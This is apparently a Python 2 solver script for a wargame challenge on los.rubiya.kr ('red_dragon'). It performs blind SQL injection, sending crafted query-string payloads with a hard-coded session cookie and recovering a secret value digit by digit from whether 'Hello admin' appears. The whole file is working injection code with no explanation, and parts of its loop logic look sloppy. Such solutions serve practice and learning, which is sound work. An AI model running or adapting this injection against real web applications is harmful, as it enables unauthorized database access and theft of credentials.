#!/usr/bin/python
#-*-coding:utf-8  -*-

#length = 32
#hex(pw) length = 64
#pw = 32 ascii words 
#Blind SQL Injection 문자 찾기!!
import urllib,urllib2,requests,time

leng = 1
password=""
guestword=""
num = "0123456789"
heex = "0123456789abcdef"
letter = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
'''
for k in range(1,100):
	print("finding length : "+ str(k))
	url="https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id=%27||no%3E%23&no=%0a"+str(leng)
	#print url
	r = requests.post(url,cookies=(dict(PHPSESSID="4n9ooktf179ghog6m9loebtkhh")))
	if 'Hello admin' in r.text:
		leng *= 10
	else :
		print "length is : " + str(k-1)
		length = k-1
		break
'''
k=9
eachnum = [0,0,0,0,0,0,0,0,0]
for j in range(1,k+1):
	for i in range(0,10):
		url="https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id=%27||no%3E%23&no=%0a"+str(eachnum[0])+str(eachnum[1])+str(eachnum[2])+str(eachnum[3])+str(eachnum[4])+str(eachnum[5])+str(eachnum[6])+str(eachnum[7])+str(eachnum[8])
		print url
		r = requests.post(url,cookies=(dict(PHPSESSID="4n9ooktf179ghog6m9loebtkhh")))
		if 'Hello admin' in r.text:
			eachnum[j-1]=i+1
		else :
			password += str(i-1)
			print "password is : " + password
			eachnum[j-1]=i-1
			break


